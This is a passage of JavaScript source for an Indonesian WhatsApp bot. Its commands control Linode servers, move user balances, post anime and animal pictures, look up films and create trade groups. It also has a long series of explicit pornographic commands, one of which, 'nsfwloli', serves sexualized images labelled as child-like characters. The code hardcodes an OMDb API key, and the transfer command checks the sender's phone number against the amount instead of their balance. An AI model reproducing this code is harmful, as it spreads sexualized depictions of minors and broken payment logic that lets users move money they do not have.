          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${LINODE_API_TOKEN}`,
          },
        }
      );

      if (response.status === 200) {
        reply('VPS (Linode) sedang dimatikan...');
      } else {
        reply('Gagal mematikan VPS (Linode).');
      }
    } catch (error) {
      reply('Terjadi kesalahan saat mematikan VPS (Linode):', error.message);
    }
  }

  turnOffLinode();
  break;
}

case "onlinode": {
  if (!isOwner) return reply(`Sok Asik Anjg`);
  
  let linodeId = args[0];
  if (!linodeId) return reply('ID Linode belum diberikan.');

  async function turnOnLinode() {
    try {
      const response = await axios.post(
        `https://api.linode.com/v4/linode/instances/${linodeId}/boot`,
        {},
        {
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${LINODE_API_TOKEN}`,
          },
        }
      );

      if (response.status === 200) {
        reply('VPS (Linode) sedang diaktifkan...');
      } else {
        reply('Gagal mengaktifkan VPS (Linode).');
      }
    } catch (error) {
      reply('Terjadi kesalahan saat mengaktifkan VPS (Linode):', error.message);
    }
  }

  turnOnLinode();
  break;
}
case "rebootlinode": {
  if (!isOwner) return reply(`Sok Asik Anjg`);
  
  let linodeId = args[0];
  if (!linodeId) return reply('ID Linode belum diberikan.');

  async function rebootLinode() {
    try {
      const response = await axios.post(
        `https://api.linode.com/v4/linode/instances/${linodeId}/reboot`,
        {},
        {
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${LINODE_API_TOKEN}`,
          },
        }
      );

      if (response.status === 200) {
        reply('VPS (Linode) sedang direboot...');
      } else {
        reply('Gagal me-reboot VPS (Linode).');
      }
    } catch (error) {
      reply('Terjadi kesalahan saat me-reboot VPS (Linode):', error.message);
    }
  }

  rebootLinode();
  break;
}
case 'saldonya': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
  if (args.length >= 1) {
    let receiverNumber = args[0].trim(); // Nomor penerima
    if (!receiverNumber.endsWith('@s.whatsapp.net')) {
      // Tambahkan '@s.whatsapp.net' jika tidak ada
      receiverNumber += '@s.whatsapp.net';
    }

    // Menggunakan findIndex untuk mencari data pengguna berdasarkan ID
    const userIndex = db_saldo.findIndex((entry) => entry.id === receiverNumber);

    if (userIndex !== -1) {
      const { id, saldo, transaksi } = db_saldo[userIndex]; // Mengambil informasi dari db_saldo
      const koinPerakPengguna = cekKoinPerak(receiverNumber); // Mengambil jumlah koin perak pengguna
      reply(`*━━ CHECK INFO ━━*
 _• *Nomer:* ${receiverNumber.split('@')[0]}_
 _• *Saldo:* Rp${toRupiah(saldo)}_
 _• *Koin Perak:* ${koinPerakPengguna} Koin Perak_`);
    } else {
      reply(`Maaf, informasi untuk ID ${receiverNumber} tidak ditemukan.`);
    }
  } else {
    reply(`Format pesan tidak sesuai. Gunakan format ".sendsaldo 62xxxxx@s.whatsapp.net".`);
  }
}
break;
case 'tfsaldo': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
  const args = q.split(',');
  if (args.length !== 2) {
    return reply(`Format yang benar: ${prefix}tfsaldo nomorpenerima,jumlah`);
  }

  const senderNumber = sender.split('@')[0]; // Nomor pengirim dari pengirim perintah
  const receiverNumber = args[0].trim(); // Nomor penerima
  const amount = parseInt(args[1]); // Jumlah saldo yang akan ditransfer

  // Validasi jumlah saldo yang akan ditransfer
  if (isNaN(amount) || amount <= 0) {
    return reply('Jumlah saldo yang valid harus positif dan bukan huruf.');
  }

  // Validasi untuk mencegah mentransfer uang ke diri sendiri
  if (senderNumber === receiverNumber) {
    return reply('Anda tidak dapat mentransfer uang ke diri sendiri.');
  }

  // Cek saldo pengirim
  const senderBalance = cekSaldo(sender + "@s.whatsapp.net", db_saldo);
  if (senderNumber < amount) {
    return reply('Saldo Anda tidak mencukupi.');
  }

  // Kurangkan saldo pengirim
  minSaldo(senderNumber + "@s.whatsapp.net", amount, db_saldo);

  // Tambah saldo penerima
  addSaldo(receiverNumber + "@s.whatsapp.net", amount, db_saldo);

  // Kirim pesan konfirmasi ke pengirim
  const pesan = `*》Catatan* : Transfer Saldo Berhasil\n*》Nomor Penerima* : ${receiverNumber}\n*》Jumlah* : Rp${amount}`;
  Biiofc.sendMessage(sender + "@s.whatsapp.net", {
    text: pesan,
    mentions: [sender]
  }).then(() => {
    reply('Transfer saldo berhasil!');
  }).catch(() => {
    reply('Gagal mengirim pesan konfirmasi ke pengirim saldo.');
  });

  // Kirim pesan konfirmasi ke penerima
  const capt = `Halo @${receiverNumber.split("@")[0]}, Anda telah menerima transfer saldo sebesar Rp${amount}`;
  Biiofc.sendMessage(receiverNumber + "@s.whatsapp.net", {
    text: capt,
    mentions: [receiverNumber]
  }).then(() => {
    // Tidak perlu memberi tahu penerima dalam grup bahwa mereka menerima saldo
  }).catch(() => {
    reply('Gagal mengirim pesan konfirmasi ke penerima saldo.');
  });
}
break;        
case 'animeawoo':{
XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/awoo`)       
            await Biiofc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animemegumin':{
XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/megumin`)       
            await Biiofc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animeshinobu':{
XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/shinobu`)       
            await Biiofc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animehandhold':{
XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/handhold`)       
            await Biiofc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animehighfive':{
XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/highfive`)       
            await Biiofc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animecringe':{
XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/cringe`)       
            await Biiofc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animedance':{
XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/dance`)       
            await Biiofc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animehappy':{
XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/happy`)       
            await Biiofc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animeglomp':{
XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/glomp`)       
            await Biiofc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animesmug':{
XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/smug`)       
            await Biiofc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animeblush':{
XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/blush`)       
            await Biiofc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animewave':{
XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/wave`)       
            await Biiofc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animesmile':{
XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/smile`)       
            await Biiofc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animepoke':{
XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/poke`)       
            await Biiofc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animewink':{
XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/wink`)       
            await Biiofc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animebonk':{
XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/bonk`)       
            await Biiofc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animebully':{
XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/bully`)       
            await Biiofc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animeyeet':{
XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/yeet`)       
            await Biiofc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animebite':{
XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/bite`)       
            await Biiofc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animelick':{
XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/lick`)       
            await Biiofc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animekill':{
XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/kill`)       
            await Biiofc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animecry':{
XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/cry`)       
            await Biiofc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animewlp':{
XeonStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/wallpaper`)       
            await Biiofc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animekiss':{
XeonStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/kiss`)       
            await Biiofc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animehug':{
XeonStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/hug`)       
            await Biiofc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animeneko':{
XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/neko`)       
            await Biiofc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animepat':{
XeonStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/pat`)       
            await Biiofc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animeslap':{
XeonStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/slap`)       
            await Biiofc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animecuddle':{
XeonStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/cuddle`)       
            await Biiofc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animewaifu':{
XeonStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/waifu`)       
            await Biiofc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animenom':{
XeonStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/nom`)       
            await Biiofc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animefoxgirl':{
XeonStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/fox_girl`)       
            await Biiofc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animetickle': {
XeonStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/tickle`)     
            await Biiofc.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animegecg': {
XeonStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/gecg`)     
            await Biiofc.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'dogwoof': {
XeonStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/woof`)     
            await Biiofc.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case '8ballpool': {
XeonStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/8ball`)     
            await Biiofc.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'goosebird': {
XeonStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/goose`)     
            await Biiofc.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animefeed': {
XeonStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/feed`)     
            await Biiofc.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'anime': {
if (!text) return reply(`Which anime are you lookin for?`)
const malScraper = require('mal-scraper')
XeonStickWait()
        const anime = await malScraper.getInfoFromName(text).catch(() => null)
        if (!anime) return reply(`Could not find`)
let animetxt = `
🎀 *Title: ${anime.title}*
🎋 *Type: ${anime.type}*
🎐 *Premiered on: ${anime.premiered}*
💠 *Total Episodes: ${anime.episodes}*
📈 *Status: ${anime.status}*
💮 *Genres: ${anime.genres}
📍 *Studio: ${anime.studios}*
🌟 *Score: ${anime.score}*
💎 *Rating: ${anime.rating}*
🏅 *Rank: ${anime.ranked}*
💫 *Popularity: ${anime.popularity}*
♦️ *Trailer: ${anime.trailer}*
🌐 *URL: ${anime.url}*
❄ *Description:* ${anime.synopsis}*`
                await Biiofc.sendMessage(m.chat,{image:{url:anime.picture}, caption:animetxt},{quoted:m})
                }
                break
                case 'imdb':
if (!text) return reply(`_Name a Series or movie`)
XeonStickWait()
            let fids = await axios.get(`http://www.omdbapi.com/?apikey=742b2d09&t=${text}&plot=full`)
            let imdbt = ""
            console.log(fids.data)
            imdbt += "⚍⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚍\n" + " ``` IMDB SEARCH```\n" + "⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎\n"
            imdbt += "🎬Title      : " + fids.data.Title + "\n"
            imdbt += "📅Year       : " + fids.data.Year + "\n"
            imdbt += "⭐Rated      : " + fids.data.Rated + "\n"
            imdbt += "📆Released   : " + fids.data.Released + "\n"
            imdbt += "⏳Runtime    : " + fids.data.Runtime + "\n"
            imdbt += "🌀Genre      : " + fids.data.Genre + "\n"
            imdbt += "👨🏻‍💻Director   : " + fids.data.Director + "\n"
            imdbt += "✍Writer     : " + fids.data.Writer + "\n"
            imdbt += "👨Actors     : " + fids.data.Actors + "\n"
            imdbt += "📃Plot       : " + fids.data.Plot + "\n"
            imdbt += "🌐Language   : " + fids.data.Language + "\n"
            imdbt += "🌍Country    : " + fids.data.Country + "\n"
            imdbt += "🎖️Awards     : " + fids.data.Awards + "\n"
            imdbt += "📦BoxOffice  : " + fids.data.BoxOffice + "\n"
            imdbt += "🏙️Production : " + fids.data.Production + "\n"
            imdbt += "🌟imdbRating : " + fids.data.imdbRating + "\n"
            imdbt += "✅imdbVotes  : " + fids.data.imdbVotes + ""
           Biiofc.sendMessage(m.chat, {
                image: {
                    url: fids.data.Poster,
                },
                caption: imdbt,
            }, {
                quoted: m,
            })
            break
case 'genshin':
if (!text) return reply(`Which genshin are you lookin for?`)
try {
const genshin = require("genshin-api")
a = text.toLowerCase();
const anime = await genshin.Characters(text)
let txt = ""
txt += `🎀 *Name:* ${anime.name}\n`
txt += `🎖️ *Title:* ${anime.title}\n`
txt += `💠 *Vision:* ${anime.vision}\n`
txt += `🏹 *Weapon:* ${anime.weapon}\n`
txt += `💮 *Gender:* ${anime.gender}\n`
txt += `🌏 *Nation:* ${anime.nation}\n`
txt += `🪷 *Affiliation:* ${anime.affiliation}\n`
txt += `🌟 *Rarity:* ${anime.rarity}\n`
txt += `❄️ *Constellation:* ${anime.constellation}\n`
txt += `📖 *Description:* ${anime.description}\n`
txt += `🌐 *Url:* https://genshin-impact.fandom.com/wiki/${a}\n`
urll = `https://api.genshin.dev/characters/${a}/portrait`
await Biiofc.sendMessage(m.chat,{image:{url:urll}, caption:txt},{quoted:m})
} catch (err) {
console.log(err)
return reply('Error')
}
break
  case "mc":{
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
if (!text) return reply("salah contoh .mc 250k by RafatharOffcial")
let cret = await Biiofc.groupCreate(text, [])
let response = await Biiofc.groupInviteCode(cret.id)
let teks = `「 *Create Group Mc By ${namaCreator}* 」

GRUP MC SUDAH DI BUAT ATAS NAMA *${text}* SILAHKAN MASUK MELALUI LINK YANG ADA DI BAWAH YAH GENGS

*⥁* Name : ${cret.subject}
*⥁* MC BY : ${namaCreator}
*⥁* Creation : ${moment(cret.creation * 1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")} WIB
*⥁* Link : https://chat.whatsapp.com/${response}
`
setTimeout(() => {
reply(teks) 
}, 7000)
setTimeout(() => {
Biiofc.groupParticipantsUpdate(cret.id, [m.sender], "promote")
}, 5000)
setTimeout(() => {
Biiofc.groupParticipantsUpdate(cret.id, [m.sender], "add")
}, 1000)
}
break
case 'donemc':{
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*

Penggunaan:
${prefix + command} item,nominal`);
let item = t[0];
let nominal = t[1];
reply(`*ALHAMDULILAH ALL TRX DONE ✅*
*TERIMA KASIH ATAS KEPERCAYAANYA*
*TELAH MENGGUNAKAN JASA ADMIN *${namaCreator}*

*ITEM : ${item}*
*TANGGAL : ${tanggal}*
*NOMINAL : ${nominal}*
*WAKTU : ${jam}*
*SISTEM : MC*
*BUYYER : DONE✅*
*SELLER : DONE✅*

*JIKA KEDUANYA TELAH DONE,MAKA JIKA ADA SESUATU YANG TERJADI DI LAIN HARI BUKAN TANGGUBG JAWAB ADMIN LAGI !!!*

*TERIMA KASIH TELAH MENGGUNAKAN JASA ADMIN ${namaCreator}*`)
}
        break      
case 'animeavatar': {
XeonStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/avatar`)     
            await Biiofc.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'lizardpic': {
XeonStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/lizard`)     
            await Biiofc.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'catmeow': {
XeonStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/meow`)     
            await Biiofc.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
 case 'trap' :
if (!m.isGroup) return XeonStickGroup()

 waifudd = await axios.get(`https://waifu.pics/api/nsfw/${command}`)       
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
break
case 'hentai-neko' :
case 'hneko' :
if (!m.isGroup) return XeonStickGroup()

    waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
break
case 'hentai-waifu' :
case 'nwaifu' :
if (!m.isGroup) return XeonStickGroup()

        
XeonStickWait()
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`)         
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
break
case 'gasm':
if (!m.isGroup) return XeonStickGroup()
	
XeonStickWait()						
 waifudd = await axios.get(`https://nekos.life/api/v2/img/${command}`)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
break  
case 'milf':
if (!m.isGroup) return XeonStickGroup()
XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/milf.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break 
case 'animespank':
if (!m.isGroup) return XeonStickGroup()

XeonStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/spank`)     
            await Biiofc.sendMessage(m.chat, { caption:  `Here you go!`, image: {url:waifudd.data.url} },{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'ahegao':
if (!m.isGroup) return XeonStickGroup()
	
XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/ahegao.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'ass':
if (!m.isGroup) return XeonStickGroup()
	
XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/ass.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'bdsm':
if (!m.isGroup) return XeonStickGroup()
	
XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/bdsm.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'blowjob':
if (!m.isGroup) return XeonStickGroup()
	
XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/blowjob.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'cuckold':
if (!m.isGroup) return XeonStickGroup()
	
XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/cuckold.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'cum':
if (!m.isGroup) return XeonStickGroup()
	
XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/cum.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'eba':
if (!m.isGroup) return XeonStickGroup()
	
XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/eba.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'ero':
if (!m.isGroup) return XeonStickGroup()
	
XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/ero.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'femdom':
if (!m.isGroup) return XeonStickGroup()
	
XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/femdom.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'foot':
if (!m.isGroup) return XeonStickGroup()
	
XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/foot.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'gangbang':
if (!m.isGroup) return XeonStickGroup()
	
XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/gangbang.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'glasses':
if (!m.isGroup) return XeonStickGroup()
	
XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/glasses.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'hentai':
if (!m.isGroup) return XeonStickGroup()
	
XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/hentai.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'jahy':
if (!m.isGroup) return XeonStickGroup()
	
XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/jahy.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'manga':
if (!m.isGroup) return XeonStickGroup()
	
XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/manga.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'masturbation':
if (!m.isGroup) return XeonStickGroup()
	
XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/masturbation.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'neko-hentai':
if (!m.isGroup) return XeonStickGroup()
	
XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/neko.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'neko-hentai2':
if (!m.isGroup) return XeonStickGroup()
	
XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/neko2.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'nsfwloli':
if (!m.isGroup) return XeonStickGroup()
	
XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/nsfwloli.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'orgy':
if (!m.isGroup) return XeonStickGroup()
	
XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/orgy.json'))
var xeonyresult = pickRandom(ahegaonsfw)
Biiofc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'panties':
if (!m.isGroup) return XeonStickGroup()
	
XeonStickWait()
